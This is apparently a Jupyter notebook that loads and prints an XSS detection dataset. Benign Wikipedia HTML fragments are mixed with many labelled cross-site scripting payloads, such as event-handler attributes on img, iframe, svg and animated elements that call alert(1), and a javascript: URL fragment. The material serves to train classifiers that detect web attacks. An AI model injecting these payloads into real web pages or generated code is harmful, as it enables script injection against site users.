{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:05.542384500Z",
     "start_time": "2024-05-30T14:30:01.728518200Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": "       Unnamed: 0                                           Sentence  Label\n0               0  <li><a href=\"/wiki/File:Socrates.png\" class=\"i...      0\n1               1               <tt onmouseover=\"alert(1)\">test</tt>      1\n2               2  \\t </span> <span class=\"reference-text\">Steeri...      0\n3               3  \\t </span> <span class=\"reference-text\"><cite ...      0\n4               4  \\t </span>. <a href=\"/wiki/Digital_object_iden...      0\n...           ...                                                ...    ...\n13681       13681             <img onpointerenter=alert(1)>XSS</img>      1\n13682       13682  <source onbeforepaste=\"alert(1)\" contenteditab...      1\n13683       13683  <div draggable=\"true\" contenteditable>drag me<...      1\n13684       13684  <li><cite id=\"CITEREFDomingos2015\" class=\"cita...      0\n13685       13685                                         \\t </span>      0\n\n[13686 rows x 3 columns]",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>Unnamed: 0</th>\n      <th>Sentence</th>\n      <th>Label</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>0</td>\n      <td>&lt;li&gt;&lt;a href=\"/wiki/File:Socrates.png\" class=\"i...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>1</td>\n      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>2</td>\n      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;Steeri...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>3</td>\n      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;&lt;cite ...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>4</th>\n      <td>4</td>\n      <td>\\t &lt;/span&gt;. &lt;a href=\"/wiki/Digital_object_iden...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>13681</th>\n      <td>13681</td>\n      <td>&lt;img onpointerenter=alert(1)&gt;XSS&lt;/img&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13682</th>\n      <td>13682</td>\n      <td>&lt;source onbeforepaste=\"alert(1)\" contenteditab...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13683</th>\n      <td>13683</td>\n      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13684</th>\n      <td>13684</td>\n      <td>&lt;li&gt;&lt;cite id=\"CITEREFDomingos2015\" class=\"cita...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>13685</th>\n      <td>13685</td>\n      <td>\\t &lt;/span&gt;</td>\n      <td>0</td>\n    </tr>\n  </tbody>\n</table>\n<p>13686 rows × 3 columns</p>\n</div>"
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import os.path\n",
    "\n",
    "import numpy as np\n",
    "import  pandas as pd\n",
    "import torch\n",
    "\n",
    "df = pd.read_csv('XSS_dataset.csv',encoding='UTF-8')\n",
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [
    {
     "data": {
      "text/plain": "                                                Sentence  Label\n17           <style onmouseleave=\"alert(1)\">test</style>      1\n18                    <svg><meta onload=alert(1)></meta>      1\n20     <figcaption onpointerleave=alert(1)>XSS</figca...      1\n23     <datalist id=x tabindex=1 onfocusin=alert(1)><...      1\n24             <input type=image src=1 onerror=alert(1)>      1\n...                                                  ...    ...\n13675      <details onpointerover=alert(1)>XSS</details>      1\n13676  <element onkeydown=\"alert(1)\" contenteditable>...      1\n13681             <img onpointerenter=alert(1)>XSS</img>      1\n13682  <source onbeforepaste=\"alert(1)\" contenteditab...      1\n13683  <div draggable=\"true\" contenteditable>drag me<...      1\n\n[7368 rows x 2 columns]",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>Sentence</th>\n      <th>Label</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>17</th>\n      <td>&lt;style onmouseleave=\"alert(1)\"&gt;test&lt;/style&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>18</th>\n      <td>&lt;svg&gt;&lt;meta onload=alert(1)&gt;&lt;/meta&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>20</th>\n      <td>&lt;figcaption onpointerleave=alert(1)&gt;XSS&lt;/figca...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>23</th>\n      <td>&lt;datalist id=x tabindex=1 onfocusin=alert(1)&gt;&lt;...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>24</th>\n      <td>&lt;input type=image src=1 onerror=alert(1)&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>13675</th>\n      <td>&lt;details onpointerover=alert(1)&gt;XSS&lt;/details&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13676</th>\n      <td>&lt;element onkeydown=\"alert(1)\" contenteditable&gt;...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13681</th>\n      <td>&lt;img onpointerenter=alert(1)&gt;XSS&lt;/img&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13682</th>\n      <td>&lt;source onbeforepaste=\"alert(1)\" contenteditab...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13683</th>\n      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n      <td>1</td>\n    </tr>\n  </tbody>\n</table>\n<p>7368 rows × 2 columns</p>\n</div>"
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_attack = df.loc[df['Label'] == 1, ['Sentence', 'Label']]\n",
    "df_attack[5:]"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:05.644539300Z",
     "start_time": "2024-05-30T14:30:05.531094600Z"
    }
   },
   "id": "1f28ab95aa16c6d1"
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "outputs": [
    {
     "data": {
      "text/plain": "                                                Sentence  Label\n0      <li><a href=\"/wiki/File:Socrates.png\" class=\"i...      0\n1                   <tt onmouseover=\"alert(1)\">test</tt>      1\n2      \\t </span> <span class=\"reference-text\">Steeri...      0\n3      \\t </span> <span class=\"reference-text\"><cite ...      0\n4      \\t </span>. <a href=\"/wiki/Digital_object_iden...      0\n...                                                  ...    ...\n13681             <img onpointerenter=alert(1)>XSS</img>      1\n13682  <source onbeforepaste=\"alert(1)\" contenteditab...      1\n13683  <div draggable=\"true\" contenteditable>drag me<...      1\n13684  <li><cite id=\"CITEREFDomingos2015\" class=\"cita...      0\n13685                                         \\t </span>      0\n\n[13686 rows x 2 columns]",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>Sentence</th>\n      <th>Label</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>&lt;li&gt;&lt;a href=\"/wiki/File:Socrates.png\" class=\"i...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>&lt;tt onmouseover=\"alert(1)\"&gt;test&lt;/tt&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;Steeri...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>\\t &lt;/span&gt; &lt;span class=\"reference-text\"&gt;&lt;cite ...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>4</th>\n      <td>\\t &lt;/span&gt;. &lt;a href=\"/wiki/Digital_object_iden...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>13681</th>\n      <td>&lt;img onpointerenter=alert(1)&gt;XSS&lt;/img&gt;</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13682</th>\n      <td>&lt;source onbeforepaste=\"alert(1)\" contenteditab...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13683</th>\n      <td>&lt;div draggable=\"true\" contenteditable&gt;drag me&lt;...</td>\n      <td>1</td>\n    </tr>\n    <tr>\n      <th>13684</th>\n      <td>&lt;li&gt;&lt;cite id=\"CITEREFDomingos2015\" class=\"cita...</td>\n      <td>0</td>\n    </tr>\n    <tr>\n      <th>13685</th>\n      <td>\\t &lt;/span&gt;</td>\n      <td>0</td>\n    </tr>\n  </tbody>\n</table>\n<p>13686 rows × 2 columns</p>\n</div>"
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = df[['Sentence','Label']]\n",
    "df"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:30:05.674790700Z",
     "start_time": "2024-05-30T14:30:05.559984600Z"
    }
   },
   "id": "e0104ab37ebc8291"
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "outputs": [
    {
     "data": {
      "text/plain": "['<li><a href=\"/wiki/File:Socrates.png\" class=\"image\"><img alt=\"Socrates.png\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png\" decoding=\"async\" width=\"18\" height=\"28\" class=\"noviewer\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x\" data-file-width=\"326\" data-file-height=\"500\" /> </a> <a href=\"/wiki/Portal:Philosophy\" title=\"Portal:Philosophy\">Philosophy&#32;portal </a> </li> </ul>',\n '<tt onmouseover=\"alert(1)\">test</tt>',\n '\\t </span> <span class=\"reference-text\">Steering for the 1995 \"<a href=\"/wiki/History_of_autonomous_cars#1990s\" class=\"mw-redirect\" title=\"History of autonomous cars\">No Hands Across America </a>\" required \"only a few human assists\". ',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation web\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.mileseducation.com/finance/artificial_intelligence\">\"Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate\" </a>. <i>www.mileseducation.com </i><span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 September ',\n '\\t </span>. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1016%2FS0921-8890%2805%2980025-9\">10.1016/S0921-8890(05)80025-9 </a>. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf\">Archived </a> <span class=\"cs1-format\">(PDF) ',\n '<li id=\"cite_note-118\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-118\">^ </a> </b> ',\n '<li><a href=\"/wiki/Contextualism\" title=\"Contextualism\">Contextualism </a> </li>',\n '<li id=\"cite_note-Representing_causation-95\"><span class=\"mw-cite-backlink\">^ <a href=\"#cite_ref-Representing_causation_95-0\"><sup><i><b>a </b> </i> </sup> </a> <a href=\"#cite_ref-Representing_causation_95-1\"><sup><i><b>b </b> </i> </sup> </a> ',\n ' <tr><td class=\"plainlist\" style=\"padding:0 0.1em 0.4em\">',\n '\\t </span>',\n '<li><a href=\"/wiki/Mind%E2%80%93body_problem\" title=\"Mind–body problem\">Mind–body problem </a>',\n '<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>',\n '<col draggable=\"true\" ondragenter=\"alert(1)\">test</col>',\n '<caption onpointerdown=alert(1)>XSS</caption>',\n '\\t </span>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>',\n '<style onmouseleave=\"alert(1)\">test</style>',\n '<svg><meta onload=alert(1)></meta>',\n '<li><a href=\"/wiki/Programming_language\" title=\"Programming language\">Programming language </a> </li>',\n '<figcaption onpointerleave=alert(1)>XSS</figcaption>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation news\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not\">\"From not working to neural networking\" </a>. <i>The Economist </i>. 2016<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">26 April ',\n '</div>',\n '<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>',\n '<input type=image src=1 onerror=alert(1)>',\n '<strong ondblclick=\"alert(1)\">test</strong>',\n '<li><a href=\"/wiki/Computer_data_storage\" title=\"Computer data storage\">Information storage systems </a> </li>',\n '<div draggable=\"true\" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\"><a href=\"/wiki/Woody_Evans\" title=\"Woody Evans\">Evans, Woody </a> (2015). \"Posthuman Rights: Dimensions of Transhuman Worlds\". <i>Teknokultura </i>. <b>12 </b> (2). <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072\">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<spacer onkeypress=\"alert(1)\" contenteditable>test</spacer>',\n '<li><cite id=\"CITEREFOudeyer2010\" class=\"citation journal\">Oudeyer, P-Y. (2010). <a rel=\"nofollow\" class=\"external text\" href=\"http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf\">\"On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development\" </a> <span class=\"cs1-format\">(PDF) ',\n '<style>@keyframes slidein {}</style><center style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></center>',\n '<pre draggable=\"true\" ondragend=\"alert(1)\">test</pre>',\n '\\t </span>',\n '<li><a href=\"#CITEREFNilsson1998\">Nilsson 1998 </a>, chpt. 8 </li> </ul>',\n '<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>',\n '<style>@keyframes x{}</style><main style=\"animation-name:x\" onanimationstart=\"alert(1)\"></main>',\n '<article draggable=\"true\" ondrag=\"alert(1)\">test</article>',\n '<li><a href=\"/wiki/Computational_physics\" title=\"Computational physics\">Computational physics </a> </li>',\n '\\t </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1017%2FS0140525X00005756\">10.1017/S0140525X00005756 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<rtc draggable=\"true\" ondragleave=\"alert(1)\">test</rtc>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Prakken, Henry (31 August 2017). \"On the problem of making autonomous vehicles conform to traffic law\". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1007%2Fs10506-017-9210-0\">10.1007/s10506-017-9210-0 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '\\t<sup id=\"cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1\" class=\"reference\"><a href=\"#cite_note-Biological_intelligence_vs._intelligence_in_general-16\">&#91;16&#93; </a> </sup>',\n '\\t\\t\\t<div class=\"thumbcaption\">',\n '<li id=\"cite_note-recurse-409\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-recurse_409-0\">^ </a> </b> ',\n '<div draggable=\"true\" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>',\n '\\t\\t </div>',\n '<li><a href=\"/wiki/Glossary_of_calculus\" title=\"Glossary of calculus\">Calculus </a> </li>',\n '<frame oncut=\"alert(1)\" contenteditable>test</frame>',\n '<ul class=\"simple\">',\n '<frameset onmouseover=\"alert(1)\">test</frameset>',\n '<style>@keyframes x{}</style><nobr style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nobr>',\n '<h4><span class=\"mw-headline\" id=\"Technological_singularity\">Technological singularity ',\n '\\t </span>(1700) </li>',\n '<iframe onload=alert(1)></iframe>',\n '<strong draggable=\"true\" ondragstart=\"alert(1)\">test</strong>',\n '\\t </span> </h3>',\n '<li id=\"cite_note-304\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-304\">^ </a> </b> ',\n '<!DOCTYPE html><html class=\"no-js\" lang=\"en\" > ',\n '<style>@keyframes x{}</style><h1 style=\"animation-name:x\" onanimationstart=\"alert(1)\"></h1>',\n '<article onpointerleave=alert(1)>XSS</article>',\n '<nextid onmousemove=\"alert(1)\">test</nextid>',\n 'javascript:document.location=',\n '<style>@keyframes x{}</style><area style=\"animation-name:x\" onanimationend=\"alert(1)\"></area>',\n '<blockquote onpointermove=alert(1)>XSS</blockquote>',\n '<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>',\n '\\t <div style=\"padding:0em 0.25em\">',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '\\t </span>',\n '<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationend=\"alert(1)\"></title>',\n '<li><a href=\"/wiki/Brain%E2%80%93computer_interface\" title=\"Brain–computer interface\">Neurocybernetics </a> </li>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Mathematics<br />of computing </th><td class=\"navbox-list navbox-odd\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '<h2>Built-in services<a class=\"headerlink\" href=\"#built-in-services\" title=\"Permalink to this headline\">¶</a></h2>',\n '<noembed onpointerout=alert(1)>XSS</noembed>',\n '<data onbeforecut=\"alert(1)\" contenteditable>test</data>',\n '<A HREF=\"http://ha.ckers.org@google\"></A>',\n '<plaintext oncut=\"alert(1)\" contenteditable>test</plaintext>',\n '<s onmousedown=\"alert(1)\">test</s>',\n '<address onkeypress=\"alert(1)\" contenteditable>test</address>',\n '\\t <div style=\"padding:0em 0.25em\">',\n '<optgroup onmouseover=\"alert(1)\">test</optgroup>',\n '\\t </span> <span class=\"reference-text\">',\n '\\t </span> <span class=\"reference-text\">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. \"Profilio: Psychometric Profiling to Boost Social Media Advertising.\" Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel=\"nofollow\" class=\"external autonumber\" href=\"https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising\">[1] </a> ',\n '\\t </span>',\n '<li><a href=\"/wiki/Computability_theory\" title=\"Computability theory\">Computability theory </a> </li>',\n '<script onmouseover=\"alert(1)\">test</script>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>',\n 'testing.</p>',\n '<image onclick=\"alert(1)\">test</image>',\n ' </li>',\n '<tfoot onclick=\"alert(1)\">test</tfoot>',\n '<ul onpointerenter=alert(1)>XSS</ul>',\n '<bdo draggable=\"true\" ondragenter=\"alert(1)\">test</bdo>',\n '<li><a href=\"/wiki/Mind\" title=\"Mind\">Mind </a> </li>',\n '<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>',\n '<style>@keyframes slidein {}</style><shadow style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></shadow>',\n '<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>',\n '<dd onmouseout=\"alert(1)\">test</dd>',\n '<div class=\"thumb tright\">',\n '<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>',\n '<li><a href=\"/wiki/Automated_planning_and_scheduling\" title=\"Automated planning and scheduling\">Planning </a> </li>',\n '\\t </span> <span class=\"reference-text\">',\n '<data draggable=\"true\" ondragstart=\"alert(1)\">test</data>',\n '</ul>',\n '<li><a href=\"#CITEREFRussellNorvig2003\">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>',\n '<li><a href=\"/wiki/Underdetermination\" title=\"Underdetermination\">Underdetermination </a> </li>',\n '\\t </span> <span class=\"reference-text\"><a href=\"#CITEREFMcCorduck2004\">McCorduck 2004 </a>, pp.&#160;480–483. ',\n '\\t </span> </h4>',\n '        <a href=\"intro/overview.html\" class=\"btn btn-neutral float-right\" title=\"Scrapy at a glance\" accesskey=\"n\" rel=\"next\">Next <span class=\"fa fa-arrow-circle-right\">',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+deepfake+news+could+target+them+online&amp;rft.aulast=Brown&amp;rft.aufirst=Eileen&amp;rft_id=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fhalf-of-americans-do-not-believe-deepfake-news-could-target-them-online%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<sub draggable=\"true\" ondragend=\"alert(1)\">test</sub>',\n '<li><cite id=\"CITEREFTuring1950\" class=\"citation\"><a href=\"/wiki/Alan_Turing\" title=\"Alan Turing\">Turing, Alan </a> (October 1950), \"Computing Machinery and Intelligence\", <i><a href=\"/wiki/Mind_(journal)\" title=\"Mind (journal)\">Mind </a> </i>, <b>LIX </b> (236): 433–460, <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1093%2Fmind%2FLIX.236.433\">10.1093/mind/LIX.236.433 </a>, <a href=\"/wiki/International_Standard_Serial_Number\" title=\"International Standard Serial Number\">ISSN </a>&#160;<a rel=\"nofollow\" class=\"external text\" href=\"//www.worldcat.org/issn/0026-4423\">0026-4423 </a> </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Mind&amp;rft.atitle=Computing+Machinery+and+Intelligence&amp;rft.volume=LIX&amp;rft.issue=236&amp;rft.pages=433-460&amp;rft.date=1950-10&amp;rft_id=info%3Adoi%2F10.1093%2Fmind%2FLIX.236.433&amp;rft.issn=0026-4423&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<dialog draggable=\"true\" ondragenter=\"alert(1)\">test</dialog>',\n '<iframe onblur=alert(1) id=x><input autofocus>',\n '<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>',\n '        <script src=\"_static/js/hoverxref.js\"></script>',\n '\\t </span>(2014) </li>',\n 'Refuting Mathematical Objection:',\n '\\t </span> </li>',\n '\\t </span> </li>',\n '<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>',\n ' </li>',\n '<li><a href=\"/wiki/Philosophy_of_computer_science\" title=\"Philosophy of computer science\">Computer science </a> </li> </ul> </li>',\n '<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>',\n '\\t </span> </h4>',\n '<small onbeforecut=\"alert(1)\" contenteditable>test</small>',\n '<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>',\n '<cite onkeyup=\"alert(1)\" contenteditable>test</cite>',\n '<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>',\n '<data onpointerleave=alert(1)>XSS</data>',\n '<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>',\n '\\t </span>(2012) </li>',\n '<li><a href=\"/wiki/Juggling_robot\" title=\"Juggling robot\">Juggling </a> </li>',\n '<li id=\"cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0\">^ </a> </b> ',\n '<dd onbeforecopy=\"alert(1)\" contenteditable>test</dd>',\n '\\t </span> </li>',\n '<del id=x tabindex=1 onactivate=alert(1)></del>',\n '<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>',\n '<li id=\"cite_note-262\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-262\">^ </a> </b> ',\n '<li class=\"toclevel-2 tocsection-15\"><a href=\"#Cybernetics_and_brain_simulation\"><span class=\"tocnumber\">5.1 ',\n '<optgroup onpointerover=alert(1)>XSS</optgroup>',\n '\\t </span>',\n '             </li><li style=\"min-height: 31px;\"><span style=\"display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;\"><img alt=\"\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/27px-Wikibooks-logo.svg.png\" decoding=\"async\" width=\"27\" height=\"27\" style=\"vertical-align: middle\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/41px-Wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/54px-Wikibooks-logo.svg.png 2x\" data-file-width=\"300\" data-file-height=\"300\" /> ',\n '<audio onpointermove=alert(1)>XSS</audio>',\n '<aside onmouseout=\"alert(1)\">test</aside>',\n '\\t <div>',\n '<li><a href=\"/wiki/Viv_(software)\" title=\"Viv (software)\">Viv </a><span class=\"nowrap\">&#160; ',\n '\\t </span> </a> </li>',\n '<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>',\n '\\t </span>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '\\t </span>',\n '<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>',\n '<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48\" title=\"Edit section: Philosophy 